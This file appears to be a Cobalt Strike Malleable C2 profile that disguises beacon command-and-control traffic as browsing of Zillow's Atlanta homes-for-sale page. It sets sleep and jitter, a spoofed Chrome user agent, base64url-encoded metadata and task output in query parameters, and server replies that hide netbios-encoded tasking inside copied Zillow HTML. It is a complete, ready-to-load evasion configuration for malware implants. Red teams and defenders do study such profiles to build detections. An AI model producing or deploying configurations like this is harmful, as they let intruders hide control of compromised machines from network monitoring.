https-certificate {
	set keystore "";
	set password "";
}

set sleeptime	"48000";
set jitter		"65";
set useragent	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
set dns_idle	"1.1.1.1";
set maxdns		"235";

http-get {
	
	set uri "/homes/for_sale/atlanta/";

	client {
		header "Host" "www.zillow.com";
		header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		header "Cookie" "AWSALB=kv9ox";

		metadata {
			base64url;
			parameter "fromHomePage";
		}

		parameter "go" "Search";
		parameter "qs" "bs";
		parameter "shouldFireSellPageImplicitClaimGA" "false";
	}

	server {

	header "Cache-Control" "no-cache";
	header "Content-Type" "text/html; charset=UTF-8";
	header "Vary" "Accept-Encoding";
	header "Server" "Apache-Coyote/1.1";
	header "Connection" "close";

		output {
		netbios;
		prepend "<!DOCTYPE html><html itemscope=\"\" itemtype=\"http://schema.org/Organization\" class=\"wf-loading no-js zsg-theme-modernized \" lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:og=\"http://ogp.me/ns#\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns:product=\"http://ogp.me/product#\" >  <head>    <meta http-equiv=\"x-dns-prefetch-control\" content=\"on\"/>    <link rel=\"dns-prefetch\" href=\"//www.zillowstatic.com\"/>    <link rel=\"dns-prefetch\" href=\"//fonts.googleapis.com\"/>    <link rel=\"dns-prefetch\" href=\"//photos.zillowstatic.com\"/>    <link rel=\"preconnect\" crossorigin=\"true\" href=\"https://gdp.zillow.com/api/\">  </link>  <link rel=\"preconnect\" crossorigin=\"true\" href=\"https://mortgageapi.zillow.com\"></link><meta charset=\"utf-8\"/><title>Atlanta Real Estate - Atlanta GA Homes For Sale | Zillow</title><meta name=\"description\" content=\"Zillow has 4,099 homes for sale in Atlanta GA. View listing photos, review sales history, and use our detailed real estate filters to find the perfect place.\"></meta><meta name=\"author\" content=\"Zillow, Inc.\"/><meta name=\"Copyright\" content=\"Copyright (c) 2006-2017 Zillow, Inc.\"/><script>var UI_INIT_AT = Date.now ? Date.now() : +(new Date());</script><link href=\"https://www.zillowstatic.com/static-zsg/9c6fb5d/static-zsg/zsg/z-fonts/gotham/gotham.css\" type=\"text/css\" rel=\"stylesheet\" media=\"all\"/><script>document.documentElement.className = document.documentElement.className.replace(bwf-loadingb/g, '');</script><link href=\"https://www.zillowstatic.com/static-zsg/9c6fb5d/static-zsg/zsg/zsg-core.css\" type=\"text/css\" rel=\"stylesheet\" media=\"all\"/><link href=\"https://www.zillowstatic.com/static-zsg/9c6fb5d/static-zsg/zsg/zsg-opt.css\" type=\"text/css\" rel=\"stylesheet\" media=\"all\"/><script>document.documentElement.className += ' gotham-test'</script><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/cdp/b582139/dist/community-details/css/community-details-a45e9befc9.css\" type=\"text/css\"></link><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/static-reg-login/LIVE/reg-login/css/reg-login-b9ea93b9a2.css\" type=\"text/css\"></link><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/hdp/68d38ce/home-details/css/home-details-168e1fb1bf.css\" type=\"text/css\"></link><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/s/?static.b20c067=css/z-modules/header.css&amp;static-search.c64ec75=css/search-hdp-lightbox.css,css/search-subnav.css,css/search-list.css,css/search-page-ads.css,css/photo-card.css,css/collection-inline-list-content.css,css/search-map.css,css/map-bubble.css,css/tabview-simple.css,css/map-button-addon-layers.css,css/search-affordability-filter-exposed.css,css/user-uss-lightbox.css,css/search-layout.css&amp;static-claim.a2ad0b8=css/z-modules/home-owner-claim.css&amp;static-topnav.516acd4=css/z-modules/top-nav.css,css/z-modules/top-nav-hoverable.css,css/z-modules/top-nav-wide.css,css/z-modules/top-nav-wide_ACT-994.css,css/z-modules/sub-nav-wide.css&amp;static-map.d81c3c9=css/map-button.css,css/z-modules/search-map-type-control.css&amp;static-schools.18d5a82=css/z-modules/schools-great-school-badges.css,css/z-modules/local-school-search-filters.css,css/z-modules/school-bubble.css&amp;static-pagewrapper.fc76d74=css/z-modules/header-wide.css&amp;static-hdp.a6a1abf=css/z-themes/hdp-sticky-action-bar.css\" type=\"text/css\"></link><meta name=\"msapplication-config\" content=\"none\"/><meta name=\"ROBOTS\" content=\"NOINDEX, FOLLOW\"/><meta name=\"ROBOTS\" content=\"NOYDIR\"/><link rel=\"canonical\" href=\"https://www.zillow.com/atlanta-ga/\"></link><meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no\"></meta><meta itemprop=\"name\" content=\"Zillow Real Estate, Rentals, and Mortgage\"/><meta itemprop=\"description\" content=\"The most trafficked website about home sales and rentals, with real estate values for almost every U.S. home. 1,000,000 listings that you won't find on MLS.\"/><meta itemprop=\"image\" content=\"https://www.zillowstatic.com/static/images/social/share_thumbnail.png\"></meta><link rel=\"start\" title=\"Zillow home\" href=\"/\"/><!--[if gte IE 9]><link rel=\"shortcut icon\" href=\"/static/images/ie9_favicon.ico\" type=\"image/x-icon\"/><![endif]--><meta name=\"google-translate-customization\" content=\"691f1bfccade71b5-c065751219a379dd-g64cedb67f5ea020a-a\"></meta><meta name=\"referrer\" content=\"always\"/><meta property=\"fb:app_id\" content=\"172285552816089\"/><meta property=\"og:url\" content=\"https://www.zillow.com:443/homes/for_sale/atlanta,-ga_rb/?fromHomePage=true&shouldFireSellPageImplicitClaimGA=false&fromHomePageTab=buy\"/><meta property=\"og:site_name\" content=\"Zillow\"/><meta property=\"og:title\" content=\"Atlanta Real Estate - Atlanta GA Homes For Sale | Zillow\"/><meta property=\"og:image\" content=\"https://www.zillowstatic.com/static/images/m/apple-touch-icon.png\"/><meta property=\"og:description\" content=\"Zillow has 4,099 homes for sale in Atlanta GA. View listing photos, review sales history, and use our detailed real estate filters to find the perfect place.\"/>";
		append "<meta name=\"google-signin-scope\" content=\"https://www.googleapis.com/auth/plus.login https://www.googleapis.com/auth/plus.profile.emails.read\"></meta><meta name=\"google-signin-cookiepolicy\" content=\"https://www.zillow.com\"></meta><link rel=\"alternate\" href=\"android-app://com.zillow.android.zillowmap/https/www.zillow.com/homes/for_sale/Atlanta-GA/atlanta,-ga_rb/33.887618,-84.289389,33.646176,-84.671593_rect/\"></link>";
		print;
		}
	}
}

http-post {
	set uri "/homes/for_sale/Atlanta/";
	set verb "GET";

	client {
		header "Host" "www.zillow.com";
		header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		header "Cookie" "AWSALB=kv9ox";

		output {
			base64url;
			parameter "fromHomePage";
		}

		parameter "go" "Search";
		parameter "qs" "bs";
		
		id {
			base64url;
			parameter "shouldFireSellPageImplicitClaimGA";
		}
	}

	server {
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html; charset=UTF-8";
		header "Vary" "Accept-Encoding";
		header "Server" "Apache-Coyote/1.1";
		header "Connection" "close";

		output {
			netbios;
			prepend "<!DOCTYPE html><html itemscope=\"\" itemtype=\"http://schema.org/Organization\" class=\"wf-loading no-js zsg-theme-modernized \" lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:og=\"http://ogp.me/ns#\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns:product=\"http://ogp.me/product#\" >  <head>    <meta http-equiv=\"x-dns-prefetch-control\" content=\"on\"/>    <link rel=\"dns-prefetch\" href=\"//www.zillowstatic.com\"/>    <link rel=\"dns-prefetch\" href=\"//fonts.googleapis.com\"/>    <link rel=\"dns-prefetch\" href=\"//photos.zillowstatic.com\"/>    <link rel=\"preconnect\" crossorigin=\"true\" href=\"https://gdp.zillow.com/api/\">  </link>  <link rel=\"preconnect\" crossorigin=\"true\" href=\"https://mortgageapi.zillow.com\"></link><meta charset=\"utf-8\"/><title>Atlanta Real Estate - Atlanta GA Homes For Sale | Zillow</title><meta name=\"description\" content=\"Zillow has 4,099 homes for sale in Atlanta GA. View listing photos, review sales history, and use our detailed real estate filters to find the perfect place.\"></meta><meta name=\"author\" content=\"Zillow, Inc.\"/><meta name=\"Copyright\" content=\"Copyright (c) 2006-2017 Zillow, Inc.\"/><script>var UI_INIT_AT = Date.now ? Date.now() : +(new Date());</script><link href=\"https://www.zillowstatic.com/static-zsg/9c6fb5d/static-zsg/zsg/z-fonts/gotham/gotham.css\" type=\"text/css\" rel=\"stylesheet\" media=\"all\"/><script>document.documentElement.className = document.documentElement.className.replace(bwf-loadingb/g, '');</script><link href=\"https://www.zillowstatic.com/static-zsg/9c6fb5d/static-zsg/zsg/zsg-core.css\" type=\"text/css\" rel=\"stylesheet\" media=\"all\"/><link href=\"https://www.zillowstatic.com/static-zsg/9c6fb5d/static-zsg/zsg/zsg-opt.css\" type=\"text/css\" rel=\"stylesheet\" media=\"all\"/><script>document.documentElement.className += ' gotham-test'</script><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/cdp/b582139/dist/community-details/css/community-details-a45e9befc9.css\" type=\"text/css\"></link><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/static-reg-login/LIVE/reg-login/css/reg-login-b9ea93b9a2.css\" type=\"text/css\"></link><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/hdp/68d38ce/home-details/css/home-details-168e1fb1bf.css\" type=\"text/css\"></link><link rel=\"stylesheet\" media=\"all\" href=\"https://www.zillowstatic.com/s/?static.b20c067=css/z-modules/header.css&amp;static-search.c64ec75=css/search-hdp-lightbox.css,css/search-subnav.css,css/search-list.css,css/search-page-ads.css,css/photo-card.css,css/collection-inline-list-content.css,css/search-map.css,css/map-bubble.css,css/tabview-simple.css,css/map-button-addon-layers.css,css/search-affordability-filter-exposed.css,css/user-uss-lightbox.css,css/search-layout.css&amp;static-claim.a2ad0b8=css/z-modules/home-owner-claim.css&amp;static-topnav.516acd4=css/z-modules/top-nav.css,css/z-modules/top-nav-hoverable.css,css/z-modules/top-nav-wide.css,css/z-modules/top-nav-wide_ACT-994.css,css/z-modules/sub-nav-wide.css&amp;static-map.d81c3c9=css/map-button.css,css/z-modules/search-map-type-control.css&amp;static-schools.18d5a82=css/z-modules/schools-great-school-badges.css,css/z-modules/local-school-search-filters.css,css/z-modules/school-bubble.css&amp;static-pagewrapper.fc76d74=css/z-modules/header-wide.css&amp;static-hdp.a6a1abf=css/z-themes/hdp-sticky-action-bar.css\" type=\"text/css\"></link><meta name=\"msapplication-config\" content=\"none\"/><meta name=\"ROBOTS\" content=\"NOINDEX, FOLLOW\"/><meta name=\"ROBOTS\" content=\"NOYDIR\"/><link rel=\"canonical\" href=\"https://www.zillow.com/atlanta-ga/\"></link><meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no\"></meta><meta itemprop=\"name\" content=\"Zillow Real Estate, Rentals, and Mortgage\"/><meta itemprop=\"description\" content=\"The most trafficked website about home sales and rentals, with real estate values for almost every U.S. home. 1,000,000 listings that you won't find on MLS.\"/><meta itemprop=\"image\" content=\"https://www.zillowstatic.com/static/images/social/share_thumbnail.png\"></meta><link rel=\"start\" title=\"Zillow home\" href=\"/\"/><!--[if gte IE 9]><link rel=\"shortcut icon\" href=\"/static/images/ie9_favicon.ico\" type=\"image/x-icon\"/><![endif]--><meta name=\"google-translate-customization\" content=\"691f1bfccade71b5-c065751219a379dd-g64cedb67f5ea020a-a\"></meta><meta name=\"referrer\" content=\"always\"/><meta property=\"fb:app_id\" content=\"172285552816089\"/><meta property=\"og:url\" content=\"https://www.zillow.com:443/homes/for_sale/atlanta,-ga_rb/?fromHomePage=true&shouldFireSellPageImplicitClaimGA=false&fromHomePageTab=buy\"/><meta property=\"og:site_name\" content=\"Zillow\"/><meta property=\"og:title\" content=\"Atlanta Real Estate - Atlanta GA Homes For Sale | Zillow\"/><meta property=\"og:image\" content=\"https://www.zillowstatic.com/static/images/m/apple-touch-icon.png\"/><meta property=\"og:description\" content=\"Zillow has 4,099 homes for sale in Atlanta GA. View listing photos, review sales history, and use our detailed real estate filters to find the perfect place.\"/>";
			append "<meta name=\"google-signin-scope\" content=\"https://www.googleapis.com/auth/plus.login https://www.googleapis.com/auth/plus.profile.emails.read\"></meta><meta name=\"google-signin-cookiepolicy\" content=\"https://www.zillow.com\"></meta><link rel=\"alternate\" href=\"android-app://com.zillow.android.zillowmap/https/www.zillow.com/homes/for_sale/Atlanta-GA/atlanta,-ga_rb/33.887618,-84.289389,33.646176,-84.671593_rect/\"></link>";
			print;
		}
	}
}

http-stager {
	server {
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html; charset=UTF-8";
		header "Vary" "Accept-Encoding";
		header "Server" "Apache-Coyote/1.1";
		header "Connection" "close";
	}
}
